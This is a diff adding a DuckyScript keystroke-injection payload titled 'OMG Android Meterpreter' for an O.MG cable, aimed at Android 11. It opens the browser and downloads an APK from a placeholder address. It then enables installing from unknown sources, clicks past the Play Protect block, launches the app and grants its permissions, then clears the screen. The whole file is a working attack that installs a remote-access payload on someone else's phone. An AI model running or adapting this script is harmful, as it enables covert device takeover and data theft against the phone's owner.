@@ -1,0 +1,102 @@
+REM # -----------------------------------------------------------
+REM # Title: OMG Android Meterpreter
+REM # Description: Download and install an APK on Android. 
+REM # Alt payload approach of moving around the GUI with less tabs
+REM # Timing is very tight, you probably want to increase the delays
+REM # 
+REM # Author: @_MG_ 
+REM # Target: Android 11
+REM # Notes: Set URL for APK payload below
+REM # -----------------------------------------------------------
+
+REM # -----------------------------------------------------------
+REM # clear screen (Not needed, but helps for demos)
+REM # -----------------------------------------------------------
+
+GUI ENTER
+DELAY 1000
+GUI ENTER
+
+REM # -----------------------------------------------------------
+REM # launch browser and download apk
+REM # -----------------------------------------------------------
+
+GUI b
+DELAY 1000
+CTRL l
+DELAY 50
+STRING https://x.x.x.x/omg.apk
+ENTER
+DELAY 2000
+
+REM # -----------------------------------------------------------
+REM # open apk with My Files
+REM # -----------------------------------------------------------
+
+GUI r
+DELAY 500
+CTRL f
+STRING omg.apk
+DELAY 500
+ENTER
+DELAY 500
+TAB
+DELAY 500
+ENTER
+DELAY 1000
+
+REM # -----------------------------------------------------------
+REM # open settings and allow install from unknown sources
+REM # -----------------------------------------------------------
+
+RIGHT
+ENTER
+DELAY 500
+DOWN
+DOWN
+ENTER
+
+REM # -----------------------------------------------------------
+REM # switch back to My Files and install apk
+REM # -----------------------------------------------------------
+
+GUI r
+DELAY 500
+CTRL f STRING omg.apk
+DELAY 500 ENTER DELAY 500
+TAB DELAY 500
+ENTER
+ DELAY 500
+RIGHT
+ENTER
+
+
+
+REM # -----------------------------------------------------------
+REM # Blocked by Play Protect - install anyway
+REM # -----------------------------------------------------------
+
+TAB
+ENTER
+DELAY 1000
+
+REM # -----------------------------------------------------------
+REM # open app from the installed window
+REM # -----------------------------------------------------------
+
+RIGHT
+ENTER
+
+REM # -----------------------------------------------------------
+REM # allow requested app permissions
+REM # -----------------------------------------------------------
+
+RIGHT
+ENTER
+
+REM # -----------------------------------------------------------
+REM # clear screen
+REM # -----------------------------------------------------------
+
+GUI ENTER
+ESC 
